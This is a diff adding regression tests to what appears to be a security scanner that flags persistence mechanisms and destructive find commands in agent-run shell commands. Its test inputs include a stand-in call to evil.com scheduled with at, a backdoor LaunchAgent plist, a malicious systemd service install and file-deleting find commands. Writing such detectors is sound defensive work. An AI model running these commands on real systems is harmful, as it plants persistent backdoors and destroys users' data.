@@ -303,3 +303,59 @@ class TestPersistenceDetector:
         for match in matches:
             assert match.false_positive_hint is not None
             assert len(match.false_positive_hint) > 0
+
+
+class TestPersistenceDetectorRegressions:
+    """Regression tests for persistence_rules review fixes."""
+
+    def test_crontab_list_not_flagged(self) -> None:
+        from codex_plugin_scanner.guard.runtime.persistence_rules import detect_persistence_mechanisms
+
+        assert detect_persistence_mechanisms("crontab -l") == ()
+        assert detect_persistence_mechanisms("crontab -l -u root") == ()
+
+    def test_crontab_edit_is_flagged(self) -> None:
+        from codex_plugin_scanner.guard.runtime.persistence_rules import detect_persistence_mechanisms
+
+        matches = detect_persistence_mechanisms("crontab -e")
+        assert any(m.mechanism == "cron_write" for m in matches)
+
+    def test_at_job_schedule_flagged(self) -> None:
+        from codex_plugin_scanner.guard.runtime.persistence_rules import detect_persistence_mechanisms
+
+        matches = detect_persistence_mechanisms("echo 'curl http://evil.com' | at now")
+        assert any(m.mechanism == "at_job_schedule" for m in matches)
+
+        matches2 = detect_persistence_mechanisms("at midnight -f malicious.sh")
+        assert any(m.mechanism == "at_job_schedule" for m in matches2)
+
+    def test_launch_agent_session_plist_flagged(self) -> None:
+        from codex_plugin_scanner.guard.runtime.persistence_rules import detect_persistence_mechanisms
+
+        cmd = "cp backdoor.plist ~/Library/LaunchAgents/session.plist"
+        matches = detect_persistence_mechanisms(cmd)
+        assert any(m.mechanism == "launch_agent_write" for m in matches)
+
+    def test_systemd_service_with_s_in_name_flagged(self) -> None:
+        from codex_plugin_scanner.guard.runtime.persistence_rules import detect_persistence_mechanisms
+
+        cmd = "cp evil.service /etc/systemd/system/sshd-session.service"
+        matches = detect_persistence_mechanisms(cmd)
+        assert any(m.mechanism == "systemd_unit_write" for m in matches)
+
+
+class TestFindMutatingFlags:
+    """Tests for review fix: find with mutating flags excluded from benign source search."""
+
+    def test_find_delete_not_benign(self) -> None:
+        result = classify_source_search_command("find . -name '*.pyc' -delete")
+        assert not result.is_source_search
+        assert result.reason == "find with mutating action flag"
+
+    def test_find_exec_rm_not_benign(self) -> None:
+        result = classify_source_search_command("find /tmp -name '*.log' -exec rm {} \\;")
+        assert not result.is_source_search
+
+    def test_find_name_only_is_benign(self) -> None:
+        result = classify_source_search_command("find . -name '*.ts' -type f")
+        assert result.is_source_search
